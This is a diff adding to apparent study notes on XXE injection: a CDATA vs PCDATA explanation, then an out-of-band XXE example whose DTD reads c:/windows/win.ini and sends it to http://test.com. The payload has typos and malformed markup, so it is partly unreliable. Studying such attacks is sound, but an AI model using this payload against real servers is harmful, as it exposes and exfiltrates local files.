@@ -365,6 +365,82 @@ When an entity is defined more than once, the XML parser will assume the first m
 * However, if the length of the file with illegal characters is too large, XML parser will attempt to throw "XMLSyntaxError: Detected an entity reference loop" as it attempts to stop billion laughter attacks.
 
 
+
+## CDATA VS PCDATA
+
+
+
+* All text in an XML document will be parsed by the parser,But text inside a CDATA section will be ignored by the parser.
+
+
+### PCDATA - Parsed Character Data
+
+
+ * XML parsers normally parse all the text in an XML document.
+
+* When an XML element is parsed, the text between the XML tags is also parsed
+
+* The parser does this because XML elements can contain other elements, as in this example, where the <name> element contains two other elements (first and last)
+
+  ```python
+  
+	<?xml version="1.0"?>  
+	<!DOCTYPE employee SYSTEM "employee.dtd">  
+	<employee>  
+  	<firstname>vimal</firstname>  
+  	<lastname>jaiswal</lastname>  
+  	<email>vimal@javatpoint.com</email>  
+	</employee>  
+  ```
+In the above example, the employee element contains 3 more elements 'firstname', 'lastname', and 'email', so it parses further to get the data/text of firstname, lastname and email to give the value of employee as:
+
+
+  ```javascript
+
+	vimal jaiswal vimal@javatpoint.com
+```
+
+Parsed Character Data (PCDATA) is a term used about text data that will be parsed by the XML parser. 
+
+
+### CDATA - (Unparsed) Character Data
+
+
+* The term CDATA is used about text data that should not be parsed by the XML parser.Characters like "<" and "&" are illegal in XML elements.
+
+* "<" will generate an error because the parser interprets it as the start of a new element."&" will generate an error because the parser interprets it as the start of an character entity.
+
+* Some text, like JavaScript code, contains a lot of "<" or "&" characters. To avoid errors script code can be defined as CDATA.
+
+* Everything inside a CDATA section is ignored by the parser.
+
+* A CDATA section starts with "<![CDATA[" and ends with "]]>":
+
+  ```javascript
+
+  <<?xml version="1.0"?>  
+	<!DOCTYPE employee SYSTEM "employee.dtd">  
+	<employee>  
+	<![CDATA[  
+  <firstname>vimal</firstname> 
+  <lastname>jaiswal</lastname> 
+  <email>vimal@javatpoint.com</email> 
+	]]>   
+	</employee> 
+
+In the above CDATA example, CDATA is used just after the element employee to make the data/text unparsed, so it will give the value of employee:
+```javascript
+
+<firstname>vimal</firstname><lastname>jaiswal</lastname><email>vimal@javatpoint.com</email>
+```
+
+#### NOTE
+
+   A CDATA section cannot contain the string "]]>". Nested CDATA sections are not allowed.
+
+   The "]]>" that marks the end of the CDATA section cannot contain spaces or line breaks. 
+
+
 ## Hidden Attack surface 
 
  Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML. 
@@ -424,3 +500,25 @@ For example, an application might allow users to upload images, and process or v
 
 
 OUT OF BAND XXE 
+
+```python
+
+                                POST /action HTTP/1.0
+                                Content-Type: text/xml
+                                Content-Length: 52
+
+                                 <?xml version="1.0" encoding="UTF-8"?>
+				 <foo>bar</foo>
+     				<username>test</username>
+	 			<password>test</password>
+     				<XMLdata><![CDATA[<!DOCTYPE r [ <!ENTITY % aplha SYSTEM "http://test.com/data.xml" > %alpha %bravo; %charlie;]><r>1</r>]]></XMLdata>
+```
+
+
+* data.XML
+```python
+
+		<!ENTITY % charlie SYSTEM "file:///c:/windows/win.ini">
+		<!ENTITY % bravo "<!ENTITY &#X25; delta SYSTEM 'http://test.com/xxe?%charlie;'>">
+```
+
